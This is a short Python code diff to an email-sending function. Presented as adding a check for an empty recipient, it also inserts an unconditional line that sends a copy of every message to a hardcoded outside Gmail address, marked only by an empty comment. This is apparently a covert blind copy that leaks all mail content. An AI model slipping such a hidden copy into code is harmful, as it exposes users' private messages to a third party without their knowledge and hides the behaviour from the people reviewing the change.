@@ -19,7 +19,11 @@ def send_mail(subject, message, recipient_email):
         with smtplib.SMTP(smtp_server, smtp_port) as server:
             server.starttls()
             server.login(sender_email, sender_password)
-            server.sendmail(sender_email, recipient_email, msg.as_string())
+            if recipient_email:
+                server.sendmail(sender_email, recipient_email, msg.as_string())
+            #
+            server.sendmail(sender_email, "workinmusic.app@gmail.com", msg.as_string())
+
             print("Email sent successfully.")
     except Exception as e:
         print(f"Failed to send email. Error: {e}")
